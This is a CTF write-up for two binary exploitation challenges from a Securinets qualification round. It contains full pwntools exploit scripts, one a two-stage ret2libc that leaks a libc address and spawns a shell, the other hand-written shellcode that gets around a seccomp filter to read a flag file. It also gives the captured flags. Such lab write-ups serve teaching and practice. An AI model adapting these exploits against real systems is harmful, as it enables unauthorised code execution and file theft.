# National Cyber Security Congress

[Securiday](https://www.facebook.com/Securiday-104756755537130/) qualifiation round, hosted by [Securinets](https://www.facebook.com/Securinets), a 24 hour CTF. Top #10 teams will be able to compete in Securiday CTF.<br/>
I've participated in the CTF as a member of Enthousiast team. We ranked 22 out of 295 teams internationally & 1st team in Tunisia.<br />
I'll be sharing a writeup for the Binary Exploitation challenges.

<br/>
<hr>

* ### Welcm

For this one, we get a binary & a libc, what a time saver.

As a start, we'll check the security of the binary.

<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/sec.png"><br/>
</p>
<br />

Now, let's check the binary in Ghidra:
<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/welcm.png"><br/>
</p>
<br />

A basic ret2libc, we check ropper for a `pop rdi` gadget:

<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/pop_rdi.png"><br/>
</p>
<br />

Now, let's head to GDB, we check the functions we have ( `info functions` )

<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/gdb.png"><br/>
</p>
<br />

No tricks I see, We have everything we'll need.

As a start, we'll need to leak a libc address from the GOT entry. Since we have `puts` available in the binary, we can use it to leak our address. After that, we'll be able to calculate the libc base address. Therefore, we'll be able to find `system` address in memory alongside our `/bin/sh` string.

Summary:

1. Return to `puts`, giving it it's own GOT entry address as a parameter.
2. Find libc base address.
3. Return to `system` giving it `/bin/sh` as parameter.

Considering Ghidra's output, we have 128 bytes for our input + 8 bytes for the RBP, which gives us a total of 136 bytes for the RIP offset. We can start writing our payload.

<details>
  <summary>Show payload</summary>
  
  ```python
  #!/usr/bin/env python3

  from pwn import *

  exe = ELF("./welc_patched")
  libc = ELF("./libc.so.6", checksec=False)

  context.binary = exe
  LOCAL = False


  def conn():
      if LOCAL:
          r = process([exe.path])
      else:
          r = remote("20.216.39.14", 1237)

      return r


  def main():
      r = conn()

      PUTS_PLT = p64(0x0000000000401060)
      PUTS_GOT = p64(0x404018)
      POP_RDI  = p64(0x0000000000401283)
      MAIN     = p64(0x00000000004011db)
      MAIN_RET = p64(0x000000000040121e)

      offset = 136

      # First stage
      # Leak puts address & return to main for stage 2
      payload = b"A"*offset
      payload += POP_RDI
      payload += PUTS_GOT
      payload += PUTS_PLT
      payload += MAIN

      print(payload)

      r.sendline(payload)

      r.recvuntil(b'about you ?\n')
      leak_puts = u64(r.readline()[:-1].ljust(8, b'\x00'))
      base_libc = leak_puts - libc.sym['puts'] # Libc base

      print('Leaked libc           :', hex(leak_puts))
      print('Libc base             :', hex(base_libc))

      SYSTEM = p64(libc.sym['system'] + base_libc)
      BIN    = p64(next(libc.search(b'/bin/sh')) + base_libc)

      # Stage 2, System("/bin/sh")
      payload = b"A"*offset
      payload += MAIN_RET # Alignement
      payload += POP_RDI
      payload += BIN
      payload += SYSTEM

      r.sendline(payload)

      r.interactive()


  if __name__ == "__main__":
      main()
  ```
</details>

And we get our flag: `Securinets{5d91d2e01b854fd457c1d8b592a19b38af6b4a33c6362b7d}`


* ### shellcraft

For this one, we were given a binary file. Considering the name, we'll probably be sending a shell. As a start, we check the binary's security & have a look throught Ghidra.

<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/sec2.png"><img src="/2022/Securinets%20CTF%20Quals/imgs/ghidra2.png"><br/>
</p>
<br />

Intersting... It's not just an executable stack, but we got our call ready since the begining. But there is this `sandbox` function, digging more into it gives us the following C code:

```C
  local_18 = seccomp_init(0x7fff0000);
  local_38[0] = 2;
  local_38[1] = 0x38;
  local_38[2] = 0x39;
  local_38[3] = 0x3a;
  local_38[4] = 0x3b;
  local_38[5] = 0x65;
  local_38[6] = 0x142;
  for (local_c = 0; local_c < 7; local_c = local_c + 1) {
    seccomp_rule_add(local_18,0,local_38[(int)local_c],0);
  }
  seccomp_load(local_18);
```

So it's google time! Looking for this `seccomp_rule_add` landed me on this [description](https://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html#DESCRIPTION). As we can see, this is somekind of a syscall filtering. Let's jump into GDB for more debuging... Open binary, setup a breakpoint at main+77, before we start executing our shell.

<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/gdb2.png"><br/>
</p>
<br />

We take a shellcode ([Shell storm](http://shell-storm.org/)) & plug it into our binary's input then watch what happens.<br/>
We hit the breakpoint (`0x55555555530d <main+77>:	call   rdx`) & we step into the execution.

So in my case, the shell changed `rax` value to `0x142` which is `stub_execveat` code. If you're unfamiliar with the `syscall` instruction, basically it's a way for the binary to make **system calls** to the kernel to execute a specific function. Each function have it's own code ([SysCall functions list](http://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html)), we use this code to identify which function we would like to call. We simply change the `rax` register to the function code we're seeking & set up our parameters for the function call then we use `syscall` instruction to execute it. Back to the topic, after changing the `rax` value & when we are about to make the system call, we get a crash: `Program terminated with signal SIGSYS, Bad system call.`

So as expected, we can see that the `0x142` is included in our `sandbox` code so, as we expected, this is a system call filter. 

So we'll need to find an other way to reach our flag without using the blacklisted syscalls, we can use `seccomp-tools` to get a better view for the blacklisted calls:

```
─$ seccomp-tools dump ./shellcraft  
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0013
 0006: 0x15 0x06 0x00 0x00000038  if (A == clone) goto 0013
 0007: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0013
 0008: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0013
 0009: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0013
 0010: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0013
 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

So, this is the first time I've come across this kind of challenge. After some digging up, I landed on a writeup which included a similar situation. The solution is writing your own assembly! Let's recheck our sys call list ([SysCall functions list](http://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html)). We still have `read` & `write` calls authorized, if we dig more, we'll land on `sys_openat`. This function is similar to `open`, except that we can provide a reference directory. Looking up this function ([ref](https://linux.die.net/man/2/openat)), we can either provide an absolute path to our flag file OR we can play around with the `AT_FDCWD` value. Considering the first challenge, the flag path is `/home/ctf/flag.txt`, so if we can do the following call: `openat(NULL, "/home/ctf/flag.txt", O_RDONLY)`, we'll open our flag file & get a file descriptor for it. How can we use this?

We'll have to write something like this:

```C
f = openat(NULL, "/home/ctf/flag.txt", O_RDONLY); // Open our flag file.
read(f, our_adr, 0x50); // This size should be enough to read the flag.
write(1, our_adr); // Write flag to STDOUT.
```

<br/>
If you can read assembly code, you can skip these paragraphs since I'll be mainly explaining that code.

As a start, we'll set our RAX to 0x101, which is `sys_openat` code. Then we'll need to set both RDI & RDX to 0 (equivalent to NULL) & finally we'll need to make RSI point to `/home/ctf/flag.txt` in the stack. If you're unfamiliar with calling convention for 64 bit architecture, RDI is used for passing the first argument, RSI for the second, RDX for the third. Now, how can we get RSI to point to our flag path? Heading back to GDB, we have our shell code address saved in RAX register & it's executing a `call rdx` to execute our shell, therefore, we can use this information before making any sys calls. We can move RAX value to RSI, add our payload's length to RSI & make sure to have our `/home/ctf/flag.txt` at the end of our payload. After that, we'll be able to make our syscall & we'll get the file descriptor in RAX.

After that, we'll need to execute our `read` function. For that, we can use the same address pointed by RSI since we no longer need it & it's a writeable area. We'll also need to move RAX value (file descriptor) to RSI (first argument). And finally, we'll set RAX to 0 for the `read` sys call & RDX to 0x50 for the buffer size. Then execute our syscall.

And the final part of the payload, we'll keep RSI untouched since it points to our flag, we'll change RAX to 1 (`write` sys call) & then set RDI to 1 (STDOUT file descriptor). We can do our sys call now.

After finishing our payload, we'll end up with a 62 bytes assembly code. We head back to the first stage & add 62 to RSI value to make it point at the end of our payload ;)

And the magic happens: `Securinets{56000a2e8205998dd69d74c30d6b1daca2863e66184c088b}`

Payload:

```python
from pwn import *


context.binary = './shellcraft'

# NOPs are not really needed here, we can get rid of them but we'll have to update RSI value
shellcode = b"\x90" * 5 + asm('''

    mov rsi, rdx
    add rsi, 62
    mov rax, 0x101
    xor rdi, rdi
    xor rdx, rdx
    syscall
    
    mov rdi, rax
    mov rax, 0
    mov rdx, 0x50
    syscall
    
    mov rax, 1
    mov rdi, 1
    syscall

        ''')

payload = shellcode+b"/home/ctf/flag.txt\x00"

#p = process('./shellcraft')
p = remote('20.216.39.14', 1236)

print('Shellcode length    :', len(shellcode))
print('Payload             :', payload)

p.sendline(payload)

p.interactive()
```

* ### FTP

